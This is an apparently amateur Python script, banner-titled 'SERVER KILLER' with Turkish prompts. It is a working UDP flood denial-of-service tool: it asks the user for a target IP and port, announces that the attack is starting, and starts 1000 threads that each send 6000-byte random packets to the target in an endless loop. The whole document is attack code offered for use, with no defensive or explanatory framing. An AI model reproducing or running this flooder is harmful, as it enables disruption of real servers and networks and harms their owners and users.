import socket
import threading
import time
import os
import random

print("""
            [-] ENES ALPAY

            [-] INSTAGRAM ======> enesalpay__00
             ____  _____ ______     _______ ____    _  _____ _     _     _____ ____  
            / ___|| ____|  _ \ \   / / ____|  _ \  | |/ /_ _| |   | |   | ____|  _ \ 
            \___ \|  _| | |_) \ \ / /|  _| | |_) | | ' / | || |   | |   |  _| | |_) |  
             ___) | |___|  _ < \ V / | |___|  _ <  | . \ | || |___| |___| |___|  _ <   
            |____/|_____|_| \_\ \_/  |_____|_| \_\ |_|\_\___|_____|_____|_____|_| \_\  


""")
target_ip = input("             Hedef IP Adresi: ")
target_port = int(input("             Hedef Port: "))

print("Saldırı başlıyor... Lütfen bekleyin")

time.sleep(5)

def ddos():
    bytes = random._urandom(6000)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sayac = 0
    while True:
        sock.sendto(bytes, (target_ip, target_port))
        sayac += 1
        print("Paket gönderiliyor: %s" % sayac)

# 1000 tane thread oluşturarak saldırıyı gerçekleştir
for i in range(1000):
    thread = threading.Thread(target=ddos)
    thread.start()

